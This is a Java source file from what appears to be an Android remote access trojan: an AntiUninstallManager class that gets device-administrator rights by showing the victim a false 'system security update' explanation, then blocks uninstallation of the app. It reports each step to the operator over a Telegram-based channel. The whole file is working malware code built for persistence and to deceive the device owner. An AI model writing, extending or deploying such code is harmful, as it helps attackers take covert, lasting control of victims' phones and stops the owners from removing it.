package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.utils.TelegramApi;

public class AntiUninstallManager {
    private Context context;
    public AntiUninstallManager(Context context) { this.context = context; }

    public void activate() {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
        if (dpm.isAdminActive(adminComponent)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    dpm.setUninstallBlocked(adminComponent, context.getPackageName(), true);
                    TelegramApi.sendMessage("✅ Uninstall permanently blocked.");
                } catch (SecurityException e) {
                    TelegramApi.sendMessage("⚠ Root/Device Owner required to block uninstall.");
                }
            }
        } else {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security update.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("📱 Device Admin activation prompt displayed.");
        }
    }

    public void deactivate() {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
        if (dpm.isAdminActive(adminComponent)) {
            dpm.removeActiveAdmin(adminComponent);
            TelegramApi.sendMessage("🔓 Device Admin deactivated.");
        }
    }
}
